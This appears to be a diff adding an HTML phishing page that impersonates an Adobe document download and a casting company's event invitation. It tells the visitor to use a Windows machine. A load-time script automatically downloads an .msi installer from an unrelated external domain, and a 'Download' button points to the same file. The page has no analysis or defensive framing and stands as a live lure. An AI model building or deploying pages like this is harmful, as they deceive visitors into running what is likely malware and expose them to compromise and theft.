@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Adobe Document Download</title>
+  <link rel="icon" href="favicon.ico" type="image/x-icon" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-image: url('https://allcasting.com/assets/lan/unb/xngim2iv/header-bg.jpeg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      overflow: hidden;
+      color: #fff;
+    }
+
+    .overlay {
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 2rem;
+      text-align: center;
+    }
+
+    .content-box {
+      background-color: #000; /* solid black fill */
+      border: 6px solid #fff; /* white border to separate it visually */
+      border-radius: 10px;
+      padding: 2rem 3rem;
+      max-width: 600px;
+      width: 100%;
+    }
+
+    .content-box img {
+      width: 60px;
+      margin-bottom: 1rem;
+    }
+
+    .content-box h1 {
+      font-size: 2.5rem;
+      font-weight: bold;
+      color: #ff0000;
+    }
+
+    .content-box p {
+      font-size: 1.2rem;
+      color: #ccc;
+      margin-bottom: 2rem;
+    }
+
+    .btn-download {
+      background-color: #ff0000;
+      border: none;
+      color: white;
+      padding: 14px 32px;
+      font-size: 1.2rem;
+      transition: 0.3s;
+    }
+
+    .btn-download:hover {
+      background-color: #cc0000;
+    }
+
+    footer {
+      position: absolute;
+      bottom: 0;
+      width: 100%;
+      text-align: center;
+      font-size: 0.9rem;
+      color: #ccc;
+      padding: 1rem;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="overlay">
+    <div class="content-box">
+      <img src="https://allcasting.com/assets/lan/unb/xngim2iv/allcating-logo-white.svg" alt="Adobe Logo">
+      <h1>You're Specially Invited</h1>
+      <p>Your RSVP invitation has been successfully acknowledged.<br>
+      For the best compatibility and smoothest experience, please open the file on a Windows desktop or laptop.</p>
+      <a href="https://innovativecarewa.com.au/HonoredGuestInvitation.msi" download class="btn btn-download">Download</a>
+    </div>
+  </div>
+
+  <footer>
+    &copy; 2025 AllCasting Inspired | All rights reserved.
+  </footer>
+
+  <script>
+    window.onload = function () {
+      const link = document.createElement('a');
+      link.href = 'https://innovativecarewa.com.au/HonoredGuestInvitation.msi';
+      link.download = 'https://innovativecarewa.com.au/HonoredGuestInvitation.msi';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+
+      setTimeout(() => {
+        window.location.href = 'thankyou.html';
+      }, 1000000);
+    };
+  </script>
+
+</body>
+</html>
